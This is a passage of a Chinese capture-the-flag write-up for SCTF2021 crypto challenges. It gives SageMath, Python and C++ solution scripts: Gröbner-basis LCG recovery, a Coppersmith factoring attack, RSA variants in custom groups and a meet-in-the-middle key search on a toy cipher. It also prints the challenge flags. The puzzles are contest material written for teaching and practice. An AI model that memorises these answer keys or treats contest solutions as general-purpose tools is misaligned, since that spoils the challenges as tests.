+    #s.add((p-1)*(q-1) == 10601906187740216931595985813561018154094349391814625467866276039997784519775353384474319150269738230372047308386421763681496742534415560601792743087606061049915679247822012183530512682920721493867744110943536891780424477404764918611971479616608837196312314759612406032833626939153217353695263399529371219149907244546504287005803482157028158074361894837406690284282849804962647074137779175591115328533588303073897939953060596832041619446744193574226011368389348902367198191084032689790313003404759414296565690419913481077396162900768249534438395618483441070907431902912073411573833342021889020103616571648206308514880)
+    
+    #if s.check() == sat:
+    #    print(s.model())
+    
+    
+    
+    def add(P, Q, mod):
+        x1, y1 = P
+        x2, y2 = Q
+    
+        if x2 is None:
+            return P
+        if x1 is None:
+            return Q
+    
+        if y1 is None and y2 is None:
+            x = x1 * x2 % mod
+            y = (x1 + x2) % mod
+            return (x, y)
+    
+        if y1 is None and y2 is not None:
+            x1, y1, x2, y2 = x2, y2, x1, y1
+    
+        if y2 is None:
+            if (y1 + x2) % mod != 0:
+                x = (x1 * x2 + 2) * inverse(y1 + x2, mod) % mod
+                y = (x1 + y1 * x2) * inverse(y1 + x2, mod) % mod
+                return (x, y)
+            elif (x1 - y1 ** 2) % mod != 0:
+                x = (x1 * x2 + 2) * inverse(x1 - y1 ** 2, mod) % mod
+                return (x, None)
+            else:
+                return (None, None)
+        else:
+            if (x1 + x2 + y1 * y2) % mod != 0:
+                x = (x1 * x2 + (y1 + y2) * 2) * inverse(x1 + x2 + y1 * y2, mod) % mod
+                y = (y1 * x2 + x1 * y2 + 2) * inverse(x1 + x2 + y1 * y2, mod) % mod
+                return (x, y)
+            elif (y1 * x2 + x1 * y2 + 2) % mod != 0:
+                x = (x1 * x2 + (y1 + y2) * 2) * inverse(y1 * x2 + x1 * y2 + 2, mod) % mod
+                return (x, None)
+            else:
+                return (None, None)
+    
+    def myPower(P, a, mod):
+        #myPower(M, e, finitN)
+        target = (None, None)
+        t = P
+        while a > 0:
+            if a % 2:
+                target = add(target, t, mod)
+            t = add(t, t, mod)
+            a >>= 1
+        return target
+    
+    q = 96462444106165749114415475247527781475899281431287939376394470369752659528725019508082117417839694214107263318483433819291390803338678461598066595218255356966679663156577567407281598226907095764472683889152435703416069908655422522652572101471012612583954177451023603485842114326384356753874451635385984216161
+    p = 109907086493390616985013523787169507492760993681846064986781887428535317768524351469280456086685032407075193800472550867209575915122581771387158292578171930229912424185824752394842783208794649345771724454755004504493300150933357546701398911549986363985587419816454664592991507387712041226027111204451401188919
+    pad = 137721017917989303482714812804521878485399750349045730614909765849483734915386664162501818685326223825286437120470811742765458919135068008802037057001305957541685605553587948107128475798135395471664645215380069682937424337247849713639490229310163392013463505444535723967494278649509979458626531074957697946993
+    c =(166431982461794383404765894353564652417286281286845040815812696140245010936597690881728163044999563295606777822589599719988749943986277241768406486432942976971806090294723679213709276119783333317719736480695779056909005344748713312922208943911234004090154620267867923985496066206993388826848408016113230559895319140692117846347161636934408901418900660630848238252785792937558161125236263657446105045318374541989968623804546523311550966511721989817712979188863096534909514606855128351038197938270797429538803633123512162732858973784140131107258309968348721003718514188938837464306149466871073659419970807525573186177295974780597677202177278450017235952741828648411332753623971689087414338005032425283018127420482524353019039589883070439499816602536780385008119304807415943660538320547325663679105882323899559945539040614335041356182742492246188685166079997529059728431638477119368978924088838246744082322934215253952260604000, 583811541976786499144377377934025235584387131534635007022251365145942422227051060939985851484706210836767096516219672713844985063110538384884200155176672559391335026702801538941879468724743394010709887016418730105669706000795612301487140087279830678314909581314560039721638176230206155638477025095967507768951649990761591795801514872889641096293748540210199152367695575307597602483917419532171797268649128704295643514700599003974515092476985280147122085743107678260804403848731411523152508976557299100005180707794868709825610527244045712157278351329970986028569553983677992653806577740248777743401724460474149400544970284499843498104577389527968551869656641095498167438798405641085540418812727789234175230571563718616654865504708574325812468631975439864831103170397966449939536937839005435391565163846769907939906973391750780003117155026788680288079657919663977842795793378060965920997621456965471449613549935486637988132751)
+    pad =117974859274346072583739577879237661359633939326177996925545772649078598610987301667759912933925662285927802009264196767594856451275711699740105534472053429854738915648249617679338619108159296653886787677835343872851980353011790571950727888130983528711607533379553800325336063577707548506215714783818842480239
+    e1 = 2816364923215542703181103700546313680109699436794123566226755921623782970809742716991858902522746028156003630828900076158585411663702115647361928930336417992964232866389633747914430575706682691181456229019202935906062908587609722493361057620793975135051750614902337992567625486243873224234033256269675850528518211544253411469959902538438091955199793022342556708413965433779350671626129791137318004869160747756926534289668211426638719794731091512998036558584096298208598924494265349419704363061401758956080768587013310392993665629098212668360357545504145264857268152702858316846654320106999264941629532500605382044391
+    e = 7688844608122166688554531210042890906331317367269721882913839185271394937163082744925864177779002472233203611799817777199710838582026800408107353934895515601449211254844714968565944446477081395969750472765835932266965229128856452781816269289992832230947973758915003020471524086758777628035741239238359503130190607998292797906572873297770527569698066692949759789487870533498458377873270494530630801359434977962847044065574759512179511120769361043269784870586239376868814910804487324802261815900392837165247623551114275644333697133133053782070322628235841247238848243632844856346687843129893451542644093889516093928419
+    d = inverse(e, ((p**3)-1)*((q**3)-1)*((pad**3)-1))
+    print(d)
+    #print((p-1)*(q-1)*(pad-1))
+    n = p*q*pad
+    M = myPower(c,d,n)
+    print(M)
+    print(long_to_bytes(M[0]))
+    print(long_to_bytes(M[1]))
+    #SCTF{@@##Say_say_it_again_Sometimes_the_RSA_was_winding_in_my_mind@@##}
+    
+
+###  christmasZone
+
+通过Gröbner Basis进行lcg系数的求解
+
+    
+    
+    p= 12827136631950660209216359962655539318636877290716821157529934201187219916291097512646340799814928196320503957951369709433553128222068986394496491383172957
+    vs= [(1, 41380349828344668841722013593988154321093099094259357736377736864534670060706791545109606752287504685771188039864996559723310519654574206262666374726529575), (2, 384991383452695588666216941014720946683784460631264884797727791455132234632438790091275812930469701960771509347594917989067900680524277581738313254612711871), (3, 2324819542625170348844359780621276807555503871252850096339863557086701529895982915686058495680950841284900600209950521822433876540926171344905286018406959743), (4, 9038337376811138597523510592313164861722600343233504981317555262132010358260176119807566000121093361554267202529233467631393363767071867844509978588374760233)]
+    
+    Fp = GF(p)
+    P.<a, b, x_1> = PolynomialRing(Fp)
+    
+    f = []
+    
+    for X, y in vs:
+        f.append(
+            x_1+(a*x_1+b)*X+(a^2*x_1+a*b+b)*X^2+(a^3*x_1+a^2*b+a*b+b)*X^3+(a^4*x_1+a^3*b+a^2*b+a*b+b)*X^4+(a^5*x_1+a^4*b+a^3*b+a^2*b+a*b+b)*X^5-y)
+    
+    f = ideal(f)
+    B = f.groebner_basis()
+    print(B)
+    print(-B[0])
+    
+
+再根据gift值，以及生成的特殊phi值构造二元copper  
+f(x,y) = x _(y**2+a_ y+b)+1 (x = k,y = p+q)
+
+微调参数分解n值，得到p q
+
+    
+    
+    import itertools
+    
+    def small_roots(f, bounds, m=1, d=None):
+            if not d:
+                    d = f.degree()
+    
+            R = f.base_ring()
+            N = R.cardinality()
+    
+            f /= f.coefficients().pop(0)
+            f = f.change_ring(ZZ)
+    
+            G = Sequence([], f.parent())
+            for i in range(m+1):
+                    base = N^(m-i) * f^i
+                    for shifts in itertools.product(range(d), repeat=f.nvariables()):
+                            g = base * prod(map(power, f.variables(), shifts))
+                            G.append(g)
+    
+            B, monomials = G.coefficient_matrix()
+            monomials = vector(monomials)
+    
+            factors = [monomial(*bounds) for monomial in monomials]
+            for i, factor in enumerate(factors):
+                    B.rescale_col(i, factor)
+    
+            B = B.dense_matrix().LLL()
+    
+            B = B.change_ring(QQ)
+            for i, factor in enumerate(factors):
+                    B.rescale_col(i, 1/factor)
+    
+            H = Sequence([], f.parent().change_ring(QQ))
+            for h in filter(None, B*monomials):
+                    H.append(h)
+                    I = H.ideal()
+                    if I.dimension() == -1:
+                            H.pop()
+                    elif I.dimension() == 0:
+                            roots = []
+                            for root in I.variety(ring=ZZ):
+                                    root = tuple(R(root[var]) for var in f.variables())
+                                    roots.append(root)
+                            return roots
+            return []
+    e = 2122057207992053205813770227849040233008910764365408170807753866052370273036652511326089337097360978735074872616654616913246201310148862001548717525315340025551386286859760434183016041810428435636703565295076056164899655565064479034568939414539781862057507880933035055798925469493379171063624396109774778347319852379080566673380010455470481679145108944783447900704049011034802113265281840271722439782048757303053321402550218515376334799866137565004833177407151305907248656027100625115285653505268015889011758846754314363803434935375750532978323034293333866829909394024977100845590141939498841156488858312084500963993
+    n = 64392795853847475796939596948374573513341136006013188358665448316305707477998438325517993586430100318003625505157712138814030987620038360820900112359350226402638642419396935215229157012026467896203963294845355310085476165076942465877433408205263068546705226319393063008332679430070032638523530045872344446063 
+    PR.<x,y> = PolynomialRing(Zmod(e))
+    b = n**2-n+1
+    a = n+1
+    f = x*(y**2+a*y+b)+1
+    bounds = (2^400,2^513)
+    solves = small_roots(f, bounds, m=3,d=4)
+    print(solves)
+    from z3 import *
+    s = Solver()
+    p=Int('p')
+    q=Int('q')
+    s.add(p+q == 16075043011792317702314886102947415867389005788775646985921769735667763497545302824191943535380623937133010105678608525588010746665008631519574789537497184)
+    s.add(p*q == 64392795853847475796939596948374573513341136006013188358665448316305707477998438325517993586430100318003625505157712138814030987620038360820900112359350226402638642419396935215229157012026467896203963294845355310085476165076942465877433408205263068546705226319393063008332679430070032638523530045872344446063)
+    
+    if s.check() == sat:
+        print(s.model())
+    
+
+根据复数群阶为p^2-1，进行(m1,m2)坐标的计算
+
+    
+    
+    from Crypto.Util.number import *
+    
+    def PowPlus(msg,k):
+        c=Complex(msg[0],msg[1])
+        while k>0:
+            if k%2:
+                k-=1
+                c.OnePlus()
+            else:
+                k//=2
+                c.Double()
+        return c.val()
+    
+    class Complex:
+        baseRe = 1
+        baseIm = 0
+        p= 7580404339410605275626408632293985390119410811758716323067754026905773097627216054700243523685903084284434158078654472410013702925363551739091210471600391
+        q= 8494638672381712426688477470653430477269594977016930662854015708761990399918086769491700011694720852848575947599954053177997043739645079780483579065896793
+    
+        n  = p*q
+        #print(n)
+        def __init__(self, re=0, im=0):
+            self.re = re
+            self.im = im
+    
+        def OnePlus(self):
+            _re = (self.re*Complex.baseRe - self.im*Complex.baseIm)%Complex.n
+            _im = (self.re*Complex.baseIm + self.im*Complex.baseRe)%Complex.n
+            Complex.baseRe = _re
+            Complex.baseIm = _im
+    
+        def Double(self):
+            _re  = (self.re*self.re - self.im*self.im)%Complex.n
+            _im  = (self.re*self.im + self.im*self.re)%Complex.n
+            self.re = _re
+            self.im = _im
+    
+        def val(self):
+            return Complex.baseRe,Complex.baseIm,Complex.n
+    
+    c = (19398712966389173067515660342342371376171822855077792430320907920482468319034356508473830699130119726502328267606091971072624658237697431558761718296916369668202230512807622341524837789641448767802361925545348467904711602267688826344269930586157457184165009996779745720616560780946563277776544719243932403743,
+    13560918884675796397422230974896753903564514060544004622609605573166124357809803049342207856908237157989458174631058128913271365699175849042916944962684319362603309646697695167167430136068004838289739138033112696576679443996914506782400912475705559889360576361738784125657707992917972167925405463413645788482)
+    n=64392795853847475796939596948374573513341136006013188358665448316305707477998438325517993586430100318003625505157712138814030987620038360820900112359350226402638642419396935215229157012026467896203963294845355310085476165076942465877433408205263068546705226319393063008332679430070032638523530045872344446063
+    gift=2122057207992053205813770227849040233008910764365408170807753866052370273036652511326089337097360978735074872616654616913246201310148862001548717525315340025551386286859760434183016041810428435636703565295076056164899655565064479034568939414539781862057507880933035055798925469493379171063624396109774778347319852379080566673380010455470481679145108944783447900704049011034802113265281840271722439782048757303053321402550218515376334799866137565004833177407151305907248656027100625115285653505268015889011758846754314363803434935375750532978323034293333866829909394024977100845590141939498841156488858312084500963993
+    q = 7580404339410605275626408632293985390119410811758716323067754026905773097627216054700243523685903084284434158078654472410013702925363551739091210471600391
+    p = 8494638672381712426688477470653430477269594977016930662854015708761990399918086769491700011694720852848575947599954053177997043739645079780483579065896793
+    e = 65537
+    d = inverse(e,((p**2-1)*(q**2-1)))
+    m = PowPlus(c,d)
+    print(m)
+    
+
+最后带回到lcg的最终函数中，进行求根操作
+
+    
+    
+    from Crypto.Util.number import *
+    p= 12827136631950660209216359962655539318636877290716821157529934201187219916291097512646340799814928196320503957951369709433553128222068986394496491383172957
+    Fp = GF(p)
+    P.<x> = PolynomialRing(Fp)
+    f = 11107539725989784588516877085136635908441115815151777097583290968795799306769460994508287779871429800738567516424098853986080960831813283913437018239025437+6034160863709066159778637899413973476966589977510559161150723567270894349213718484715685277168177740978230265501194740744557053261099813264349946684623551*x+11808887268447615257558026664894363806999904142221396040940006609671437127001478734524740326597666486964008913813253292274982099443656137651300834404341881*(x^2)+408075133608148131249456572820748106237284025037403147065865246531192645806945237995787775219190720718153273784347803717882930185025920239290910304167402*(x^3)+4586162932140607804368341437906558310926893012932245826928444385726983454281600231400780493854722062464754924769164109577757840996243554965034972504134321*(x^4)+7435523904449446900250673933815874711521312121405976462709406086538363177633587861964325099576317873907473145572937759422049634936735496229252692590236983*(x^5)-350564116714246428053802172070389474233820454679751477780333001945330301565284220095378516478556445046920811976843797532587184369824085245405082799485151297628128033782611724987963819163245257329754695802584996154786305817413634573781285885239952095626683987775731171250077614548234305028236410536510063272314122315196083472829068485752967550562846302833889516005729928622362083333892583681788035557019567883417091108619687009927945069447260541066489511357746392173728172212543
+    m = f.roots()[0][0]
+    long_to_bytes(m)
+    #SCTF{all1Want4ChristmasisU}
+    
+
+###  ciruit map
+
+下载附件到处看看，发现是个DES，再看看秘钥空间2^24，还有两次加密，但是有个加密0的，
+
+跑中间相遇攻击
+
+    
+    
+    #include<iostream>
+    #include<unordered_map>
+    #include<vector>
+    using namespace std;
+    
+    unsigned int SBoxes[6][16] = {
+        {15, 1, 7, 0, 9, 6, 2, 14, 11, 8, 5, 3, 12, 13, 4, 10}, 
+        {3, 7, 8, 9, 11, 0, 15, 13, 4, 1, 10, 2, 14, 6, 12, 5}, 
+        {4, 12, 9, 8, 5, 13, 11, 7, 6, 3, 10, 14, 15, 1, 2, 0}, 
+        {2, 4, 10, 5, 7, 13, 1, 15, 0, 11, 3, 12, 14, 9, 8, 6}, 
+        {3, 8, 0, 2, 13, 14, 5, 11, 9, 1, 7, 12, 4, 6, 10, 15}, 
+        {14, 12, 7, 0, 11, 4, 13, 15, 10, 3, 8, 9, 2, 6, 1, 5}};
+    unsigned int SInvBoxes[6][16] = {
+        {3, 1, 6, 11, 14, 10, 5, 2, 9, 4, 15, 8, 12, 13, 7, 0}, 
+        {5, 9, 11, 0, 8, 15, 13, 1, 2, 3, 10, 4, 14, 7, 12, 6}, 
+        {15, 13, 14, 9, 0, 4, 8, 7, 3, 2, 10, 6, 1, 5, 11, 12}, 
+        {8, 6, 0, 10, 1, 3, 15, 4, 14, 13, 2, 9, 11, 5, 12, 7}, 
+        {2, 9, 3, 0, 12, 6, 13, 10, 1, 8, 14, 7, 11, 4, 5, 15}, 
+        {3, 14, 12, 9, 5, 15, 13, 2, 10, 11, 8, 4, 1, 6, 0, 7}};
+    unsigned int PBox[] = {15, 22, 11, 20, 16, 8, 2, 3, 14, 19, 18, 1, 12, 4, 9, 13, 23, 21, 10, 17, 0, 5, 6, 7};
+    unsigned int PInvBox[] = {20, 11, 6, 7, 13, 21, 22, 23, 5, 14, 18, 2, 12, 15, 8, 0, 4, 19, 10, 9, 3, 17, 1, 16};
+    
+    unordered_map<unsigned int, unsigned int>  middle_data;
+    
+    unsigned int S(unsigned int block, unsigned int SBoxes[6][16]){
+        unsigned int output = 0;
+        for(int i = 0; i < 6; i++){
+            output |= SBoxes[i][(block >> 4 * i) & 0b1111] << 4 * i;
+        }
+        return output;
+    }
+    
+    unsigned int permute(unsigned int block, unsigned int pbox[]){
+        unsigned int output = 0;
+        unsigned int bit = 0;
+        for(int i = 0; i < 24; i++){
+            bit = (block >> pbox[i]) & 1;
+            output |= (bit << i);
+        }
+        return output;
+    }
+    
+    unsigned int encrypt_data(unsigned int block, unsigned int key){
+        unsigned int res = block;
+        for(int i = 0; i < 3; i++){
+            res ^= key;
+            res = S(res, SBoxes);
+            res = permute(res,PBox);
+        }
+        res ^= key;
+        return res;
+    }
+    
+    unsigned int decrypt_data(unsigned int block, unsigned int key){
+        unsigned int res = block;
+        res ^= key;
+        for(int i = 0; i < 3; i++){
+            res = permute(res, PInvBox);
+            res = S(res, SInvBoxes);
+            res ^= key;
+        }
+        return res;
+    }
+    
+    unsigned int encrypt(unsigned int block, unsigned int key1, unsigned int key2){
+        unsigned int res = block;
+        res = encrypt_data(res, key1);
+        res = encrypt_data(res, key2);
+        return res;
+    }
+    
+    unsigned int decrypt(unsigned int block, unsigned int key1, unsigned int key2){
+        unsigned int res = block;
+        res = decrypt_data(res, key2);
+        res = decrypt_data(res, key1);
+        return res;
+    }
+    
+    void init_middle_data(){
+        cout << "Init middle data" << endl;
+        unsigned int enc = 0;
+        for(unsigned int i = 0; i < 0x1000000; i++){
+            enc = encrypt_data(0,i);
+            if(middle_data.find(enc) == middle_data.end()){
+                middle_data.insert(pair<unsigned int, unsigned int>(enc,i));
+            }
+            else{
+                unsigned int count = 0;
+                unsigned int tmp = 0;
+                do{
+                    count++;
+                    tmp = count << 24 | enc;
+                }while(middle_data.find(tmp) != middle_data.end());
+                middle_data.insert(pair<unsigned int, unsigned int>(tmp,i));
+            }
+        }
+    }
+    
+    unordered_map<unsigned int, unsigned int> find_possible_key(unsigned int t){
+        cout << "Find possible keys for " << t << endl;
+        unordered_map<unsigned int, unsigned int> result;
+        unsigned int dec = 0;
+        for(unsigned int i = 0; i < 0x1000000; i++){
+            unsigned int dec_count = 0;
+            dec = decrypt_data(t,i);
+            unsigned int dec_tmp = dec;
+            while(middle_data.find(dec) != middle_data.end()){
+                unsigned int key = i;
+                if(result.find(key) == result.end()){
+                    result.insert(pair<unsigned int, unsigned int>(key,middle_data[dec]));
+                }
+                else{
+                    unsigned int count = 0;
+                    unsigned int tmp;
+                    do{
+                        count++;
+                        tmp = count << 24 | key;
+                    }while(result.find(tmp) != result.end());
+                    result.insert(pair<unsigned int, unsigned int>(tmp,middle_data[dec]));
+                }
+                dec_count++;
+                dec = dec_count << 24 | dec_tmp;
+            }
+        }
+        return result;
+    }
+    
+    unsigned int recover_key_part2(vector< unordered_map<unsigned int, unsigned int> > possible_keys,vector<unsigned int>enc_labels,unsigned int a0,unsigned int b0,int idxi,int idxj){
+        unordered_map<unsigned int, unsigned int> choice_keys;
+        unsigned int c, c1, b1, a00;
+        for(int i = 0; i < 4; i++){
+            if(i == idxi || i == idxj) continue;
+            choice_keys = possible_keys[i];
+            c = enc_labels[i];
+            c1 = enc_labels[idxi];
+            for(auto iter = choice_keys.begin(); iter != choice_keys.end(); ++iter){
+                b1 = iter->first;
+                if(b1 > 0x1000000) continue;
+                unsigned int dec_b1 = b1;
+                unsigned int count = 0;
+                while(choice_keys.find(b1) != choice_keys.end()){
+                    a00 = choice_keys[b1];
+                    if(a0 == a00 && decrypt(c,a0,dec_b1) == decrypt(c1,a0,b0)){
+                        return dec_b1;
+                    }
+                    count++;
+                    b1 = count << 24 | dec_b1;
+                }
+            }
+        }
+        return 0;
+    }
+    
+    bool recover_key(vector< unordered_map<unsigned int, unsigned int> > possible_keys,vector<unsigned int>enc_labels){
+        unordered_map<unsigned int, unsigned int>  choice_keys, choice_keys2;
+        unsigned int c1, b0, a0, p1, c2, a1, b1;
+        for(int i = 0; i < 4; i++){
+            cout << "Recover key " << i << endl;
+            choice_keys = possible_keys[i];
+            c1 = enc_labels[i];
+            for(int j = 0; j < 4; j++){
+                if(i == j) continue;
+                choice_keys2 = possible_keys[j];
+                c2 = enc_labels[j];
+                for(auto iter = choice_keys.begin(); iter != choice_keys.end(); ++iter){
+                    b0 = iter->first;
+                    if(b0 >= 0x1000000) continue;
+                    unsigned int count = 0;
+                    unsigned int dec_b0 = b0;
+                    while(choice_keys.find(b0) != choice_keys.end()){
+                        a0 = choice_keys[b0];
+                        p1 = decrypt(c1, a0, dec_b0);
+                        unsigned int b0_tmp = dec_b0;
+                        unsigned int count_tmp = 0;
+                        while(choice_keys2.find(b0_tmp) != choice_keys2.end()){
+                            a1 = choice_keys2[b0_tmp];
+                            if(p1 == decrypt(c2,a1,dec_b0)){
+                                b1 = recover_key_part2(possible_keys,enc_labels,a0,dec_b0,i,j);
+                                if(b1 != 0){
+                                    cout << "Find keys : a1 = " << a1 << ", b1 = " << b1 << endl;
+                                    cout << "a0 = " << a0 << ", b0 = " << dec_b0 << endl;
+                                    return true;
+                                }
+                            }
+                            count_tmp++;
+                            b0_tmp = count_tmp << 24 | dec_b0;
+                        }
+                        count++;
+                        b0 = count << 24 | dec_b0;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+    
+    
+    unsigned int g_tables[2][4][2] = {
+        {
+            {13303835, 2123830},
+            {2801785, 11303723},
+            {13499998, 248615},
+            {13892520, 7462011}},
+        {
+            {3244202, 918053},
+            {3277177, 6281266},
+            {1016382, 7097624},
+            {10016472, 13600867}}};
+    
+    int main(){
+        init_middle_data();
+        for(int i = 0; i < 2; i++){
+            vector< unordered_map<unsigned int, unsigned int> > possible_keys(4);
+            vector<unsigned int>enc_labels(4);
+            for(int j = 0; j < 4; j++){
+                possible_keys[j] = find_possible_key(g_tables[i][j][1]);
+                enc_labels[j] = g_tables[i][j][0];
+            }
+            recover_key(possible_keys,enc_labels);
+        }
+    
+    }
+    
+
+cpp求解key的1 2 3 4，然后py脚本计算flag
+
+    
+    
+    from block_cipher import decrypt_data, encrypt_data
+    from tqdm import tqdm
+    import hashlib
+    from Crypto.Util.number import *
+    
+    key = [
+        [13675268, 8343801],
+        [12870274, 10251687],
+        [12490757, 6827786],
+        [3391233, 2096572],
+        [], # 1, 2
+        [], # 3, 4
+        [], # 5, 6
+        [] # 7, 4
+    ]
+    
+    data1 = [(13303835, 2123830),
+                (2801785, 11303723),
+                (13499998, 248615),
+                (13892520, 7462011)]
+    
+    data2 = [(3244202, 918053),
+                (3277177, 6281266),
+                (1016382, 7097624),
+                (10016472, 13600867)]
+    
+    data3 = [(5944875, 3442862),
+                (7358369, 8423543),
+                (6495696, 9927178),
+                (13271900, 11855272)]
+    
+    data4 = [(5333988, 87113),
+                (9375869, 11687470),
+                (5011062, 14981756),
+                (2509493, 12330305)]
+    
+    def get_and_key(data, key):
+        res = [0, 0]
+        for i in data:
+            if decrypt_data(decrypt_data(i[1], key[1][0]), key[0][0]) == 0:
+                res[0] = decrypt_data(decrypt_data(i[0], key[1][0]), key[0][0])
+    
+            if decrypt_data(decrypt_data(i[1], key[1][0]), key[0][1]) == 0:
+                res[1] = decrypt_data(decrypt_data(i[0], key[1][0]), key[0][1])
+    
+            if decrypt_data(decrypt_data(i[1], key[1][1]), key[0][0]) == 0:
+                res[1] = decrypt_data(decrypt_data(i[0], key[1][1]), key[0][0])
+    
+            if decrypt_data(decrypt_data(i[1], key[1][1]), key[0][1]) == 0:
+                res[1] = decrypt_data(decrypt_data(i[0], key[1][1]), key[0][1])
+    
+        return res
+    
+    def get_xor_key(data, key):
+        res = [0, 0]
+        for i in data:
+            if decrypt_data(decrypt_data(i[1], key[1][0]), key[0][0]) == 0:
+                res[1] = decrypt_data(decrypt_data(i[0], key[1][0]), key[0][0])
+    
+            if decrypt_data(decrypt_data(i[1], key[1][0]), key[0][1]) == 0:
+                res[0] = decrypt_data(decrypt_data(i[0], key[1][0]), key[0][1])
+    
+            if decrypt_data(decrypt_data(i[1], key[1][1]), key[0][0]) == 0:
+                res[0] = decrypt_data(decrypt_data(i[0], key[1][1]), key[0][0])
+    
+            if decrypt_data(decrypt_data(i[1], key[1][1]), key[0][1]) == 0:
+                res[1] = decrypt_data(decrypt_data(i[0], key[1][1]), key[0][1])
+    
+        return res
+    
+    key[4] = get_and_key(data1, [key[0], key[1]])
+    key[5] = get_and_key(data2, [key[2], key[3]])
+    key[6] = get_and_key(data3, [key[4], key[5]])
+    key[7] = get_xor_key(data4, [key[6], key[3]])
+    
+    def xor(A, B):
+        return bytes(a ^ b for a, b in zip(A, B))
+    
+    the_chaos=b''
+    
+    for i in key:
+        tmp = sum(i)
+        the_chaos += bytes(long_to_bytes(tmp))
+    mask = hashlib.md5(the_chaos).digest()
+    data = long_to_bytes(0x1661fe85c7b01b3db1d432ad3c5ac83a)
+    
+    print(xor(mask, data))
+    
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Dest0g3 Team** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/264422](/post/id/264422)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [SCTF2021](/tag/SCTF2021)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://p2.ssl.qhimg.com/t011f11700404d28a24.png) Dest0g3 Team
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
